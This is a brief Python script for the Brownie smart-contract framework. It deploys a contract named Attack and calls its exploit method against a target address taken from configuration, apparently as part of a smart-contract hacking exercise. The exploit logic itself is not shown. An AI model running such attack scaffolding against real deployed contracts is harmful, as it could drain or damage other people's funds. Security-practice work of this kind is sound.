from time import sleep

from brownie import Attack, network, config
from scripts.helpful import get_account


def exploit():
    # Get account address
    account = get_account()
    # Deploy Contract
    attack = Attack.deploy({"from": account})
    # Run exploit
    attack.exploit(config['Address'], account, {"from": account})


def main():
    exploit()
